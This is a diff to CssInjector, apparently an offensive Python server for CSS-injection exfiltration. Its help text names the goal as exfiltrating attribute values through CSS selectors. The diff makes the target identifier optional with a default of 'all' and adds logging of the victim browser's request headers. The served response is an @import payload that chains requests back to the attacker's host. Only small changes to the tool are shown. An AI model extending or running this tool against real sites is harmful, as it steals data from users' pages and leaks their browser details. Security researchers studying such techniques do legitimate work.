@@ -25,6 +25,8 @@ class CssInjector:
             print(f"[{now.strftime("%Y-%m-%d %H:%M:%S")}] ✅ {message}")
         elif status == "connection":
             print(f"[{now.strftime("%Y-%m-%d %H:%M:%S")}] 🌐 {message}")
+        elif status == "connection_details":
+            print(f"[{now.strftime("%Y-%m-%d %H:%M:%S")}] ⚙️ {message}")
 
     def set_parser(self):
         parser = argparse.ArgumentParser(
@@ -41,7 +43,8 @@ class CssInjector:
         parser.add_argument(
             "-i",
             "--identifier",
-            required=True,
+            required=False,
+            default="all",
             help="CSS identifier to extract specific data",
         )
         parser.add_argument(
@@ -49,6 +52,7 @@ class CssInjector:
             "--selector",
             help="Specify a CSS Attribute Selector for exfiltration",
             default="value",
+            required=False,
         )
         parser.add_argument(
             "-d",
@@ -87,6 +91,9 @@ class CssInjector:
 
     async def handle_start(self, request):
         self.log("connection", f"Connection from {request.remote}")
+        if self.show_details:
+            for key, value in request.headers.items():
+                self.log("connection_details", f"{key} : {value}")
         self.event.set()
         return web.Response(
             text=f"@import url('//{self.hostname}:{self.port}/next?num={random.random()}'); ",
